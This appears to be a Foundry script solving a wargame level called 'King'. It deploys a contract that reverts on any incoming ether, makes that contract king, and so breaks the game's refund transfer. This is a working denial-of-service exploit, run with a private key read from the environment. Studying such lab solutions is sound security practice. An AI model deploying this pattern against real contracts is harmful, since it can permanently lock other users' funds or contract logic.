// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/King.sol";

contract CantReceiveContract {

    constructor() payable {}

    function becomeKing(address _recepient) external payable {
        (bool success, ) = address(_recepient).call{value: 1e15}(""); 
        require(success, "call failed");
    }

    /**
     * Make it obvious that contract can't receive any ethers.
     * Another solution is just an empty contract.
     */
    receive() external payable {
        revert();
    }

}

contract KingScript is Script {

    King public king = King(payable(0x9C9892dA50B808Cb623103A8dDf1256ea398505e));
    /**
     * Solution: Deploy a contract with inital funds and without any receive or fallback function.
     * AKA contract that can't receive any funds.
     * When that contract is king the transfer from King.sol won't work and this will break the game.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        CantReceiveContract cantReceiver = new CantReceiveContract{value: 1e15}();

        console.log("1. Current king", king._king());
        //vm.deal(address(cantReceiver), 1e15);
        
        cantReceiver.becomeKing(0x9C9892dA50B808Cb623103A8dDf1256ea398505e);
        console.log("2. New king", king._king());

        (bool success, ) = address(king).call{value: 1e16}(""); 
        require(success, "Can't become king");
        vm.stopBroadcast();

    }
}
